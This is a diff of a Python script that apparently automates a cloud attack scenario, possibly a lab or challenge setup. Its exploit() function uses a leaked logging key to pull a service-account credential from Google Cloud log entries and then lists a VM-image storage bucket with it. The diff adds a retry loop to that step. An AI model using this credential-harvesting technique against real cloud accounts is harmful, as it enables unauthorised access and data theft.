@@ -101,7 +101,6 @@ def create(second_deploy=True):
     data = {'name':'Robert Caldwell', 'authentication':dev_key}
     resp = req(url, method = 'POST', body = data, headers = headers)
 
-    time.sleep(5)
     hostname = exploit(nonce, logging_key)
     time.sleep(5)
     hack(hostname)
@@ -204,11 +203,15 @@ def create_tables(db_password):
 def exploit(nonce, logging_key):
     credentials, project_id = google.auth.default()
     logging_client = glogging.Client(credentials=service_account.Credentials.from_service_account_info(json.loads(logging_key)))
-    logger = logging_client.logger('rmUser')
-    logs = logger.list_entries()
-    # TODO fix sleep could crash if log is delayed
-    dev_key = list(logs)[-1].payload['auth']
-    print(dev_key)
+
+    while(True):
+        try:
+            logger = logging_client.logger('rmUser')
+            logs = logger.list_entries()
+            dev_key = list(logs)[-1].payload['auth']
+            break
+        except:
+            time.sleep(5)
     storage_client = storage.Client(credentials=service_account.Credentials.from_service_account_info(json.loads(dev_key)))
     blobs = list(storage_client.list_blobs(f'vm-image-bucket-{nonce}'))
     temp_dir = 'test/' ###TODO change me
